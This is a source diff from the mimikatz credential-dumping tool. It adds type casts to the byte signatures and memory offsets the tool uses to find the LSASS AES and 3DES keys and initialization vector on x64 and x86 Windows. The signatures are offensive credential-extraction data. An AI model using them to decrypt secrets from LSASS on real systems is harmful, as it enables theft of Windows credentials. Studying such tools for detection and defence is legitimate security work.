@@ -14,26 +14,26 @@ BYTE kiwiRandom3DES[24], kiwiRandomAES[16];
 
 #ifdef _M_X64
 BYTE PTRN_WNO8_LsaInitializeProtectedMemory_KEY[]	= {0x83, 0x64, 0x24, 0x30, 0x00, 0x44, 0x8B, 0x4C, 0x24, 0x48, 0x48, 0x8B, 0x0D};
-LONG OFFS_WNO8_hAesKey								= sizeof(PTRN_WNO8_LsaInitializeProtectedMemory_KEY) + sizeof(LONG) + 5 + 3;
-LONG OFFS_WN61_h3DesKey								= - (2 + 2 + 2 + 5 + 3 + 4 + 2 + 5 + 5 + 2 + 2 + 2 + 5 + 5 + 8 + 3 + sizeof(long));
-LONG OFFS_WN61_InitializationVector					= OFFS_WNO8_hAesKey + sizeof(long) + 3 + 4 + 5 + 5 + 2 + 2 + 2 + 4 + 3;
-LONG OFFS_WN60_h3DesKey								= - (6 + 2 + 2 + 5 + 3 + 4 + 2 + 5 + 5 + 6 + 2 + 2 + 5 + 5 + 8 + 3 + sizeof(long));
-LONG OFFS_WN60_InitializationVector					= OFFS_WNO8_hAesKey + sizeof(long) + 3 + 4 + 5 + 5 + 2 + 2 + 6 + 4 + 3;
+LONG OFFS_WNO8_hAesKey								= (LONG)sizeof(PTRN_WNO8_LsaInitializeProtectedMemory_KEY) + (LONG)sizeof(LONG) + 5 + 3;
+LONG OFFS_WN61_h3DesKey								= - (2 + 2 + 2 + 5 + 3 + 4 + 2 + 5 + 5 + 2 + 2 + 2 + 5 + 5 + 8 + 3 + (LONG)sizeof(long));
+LONG OFFS_WN61_InitializationVector					= OFFS_WNO8_hAesKey + (LONG)sizeof(long) + 3 + 4 + 5 + 5 + 2 + 2 + 2 + 4 + 3;
+LONG OFFS_WN60_h3DesKey								= - (6 + 2 + 2 + 5 + 3 + 4 + 2 + 5 + 5 + 6 + 2 + 2 + 5 + 5 + 8 + 3 + (LONG)sizeof(long));
+LONG OFFS_WN60_InitializationVector					= OFFS_WNO8_hAesKey + (LONG)sizeof(long) + 3 + 4 + 5 + 5 + 2 + 2 + 6 + 4 + 3;
 
 BYTE PTRN_WIN8_LsaInitializeProtectedMemory_KEY[]	= {0x83, 0x64, 0x24, 0x30, 0x00, 0x44, 0x8B, 0x4D, 0xD8, 0x48, 0x8B, 0x0D};
-LONG OFFS_WIN8_hAesKey								= sizeof(PTRN_WIN8_LsaInitializeProtectedMemory_KEY) + sizeof(LONG) + 4 + 3;
-LONG OFFS_WIN8_h3DesKey								= - (6 + 2 + 2 + 6 + 3 + 4 + 2 + 4 + 5 + 6 + 2 + 2 + 6 + 5 + 8 + 3 + sizeof(long));
-LONG OFFS_WIN8_InitializationVector					= OFFS_WIN8_hAesKey + sizeof(long) + 3 + 4 + 5 + 6 + 2 + 2 + 6 + 4 + 3;
+LONG OFFS_WIN8_hAesKey								= (LONG)sizeof(PTRN_WIN8_LsaInitializeProtectedMemory_KEY) + (LONG)sizeof(LONG) + 4 + 3;
+LONG OFFS_WIN8_h3DesKey								= - (6 + 2 + 2 + 6 + 3 + 4 + 2 + 4 + 5 + 6 + 2 + 2 + 6 + 5 + 8 + 3 + (LONG)sizeof(long));
+LONG OFFS_WIN8_InitializationVector					= OFFS_WIN8_hAesKey + (LONG)sizeof(long) + 3 + 4 + 5 + 6 + 2 + 2 + 6 + 4 + 3;
 #elif defined _M_IX86
 BYTE PTRN_WNO8_LsaInitializeProtectedMemory_KEY[]	= {0x8B, 0xF0, 0x3B, 0xF3, 0x7C, 0x2C, 0x6A, 0x02, 0x6A, 0x10, 0x68};
-LONG OFFS_WNO8_hAesKey								= -(5 + 6 + sizeof(long));
-LONG OFFS_WNO8_h3DesKey								= OFFS_WNO8_hAesKey - (1 + 3 + 3 + 1 + 3 + 2 + 1 + 2 + 2 + 2 + 5 + 1 + 1 + 3 + 2 + 2 + 2 + 2 + 2 + 5 + 6 + sizeof(long));
-LONG OFFS_WNO8_InitializationVector					= sizeof(PTRN_WNO8_LsaInitializeProtectedMemory_KEY);
+LONG OFFS_WNO8_hAesKey								= -(5 + 6 + (LONG)sizeof(long));
+LONG OFFS_WNO8_h3DesKey								= OFFS_WNO8_hAesKey - (1 + 3 + 3 + 1 + 3 + 2 + 1 + 2 + 2 + 2 + 5 + 1 + 1 + 3 + 2 + 2 + 2 + 2 + 2 + 5 + 6 + (LONG)sizeof(long));
+LONG OFFS_WNO8_InitializationVector					= (LONG)sizeof(PTRN_WNO8_LsaInitializeProtectedMemory_KEY);
 
 BYTE PTRN_WIN8_LsaInitializeProtectedMemory_KEY[]	= {0x8B, 0xF0, 0x85, 0xF6, 0x78, 0x2A, 0x6A, 0x02, 0x6A, 0x10, 0x68};
-LONG OFFS_WIN8_hAesKey								= -(2 + 6 + sizeof(long));
-LONG OFFS_WIN8_h3DesKey								= OFFS_WIN8_hAesKey - (1 + 3 + 3 + 1 + 3 + 2 + 2 + 2 + 2 + 2 + 2 + 2 + 1 + 3 + 2 + 2 + 2 + 2 + 2 + 2 + 6 + sizeof(long));
-LONG OFFS_WIN8_InitializationVector					= sizeof(PTRN_WIN8_LsaInitializeProtectedMemory_KEY);
+LONG OFFS_WIN8_hAesKey								= -(2 + 6 + (LONG)sizeof(long));
+LONG OFFS_WIN8_h3DesKey								= OFFS_WIN8_hAesKey - (1 + 3 + 3 + 1 + 3 + 2 + 2 + 2 + 2 + 2 + 2 + 2 + 1 + 3 + 2 + 2 + 2 + 2 + 2 + 2 + 6 + (LONG)sizeof(long));
+LONG OFFS_WIN8_InitializationVector					= (LONG)sizeof(PTRN_WIN8_LsaInitializeProtectedMemory_KEY);
 #endif
 
 bool mod_mimikatz_sekurlsa_keys_nt6::searchAndInitLSASSData()
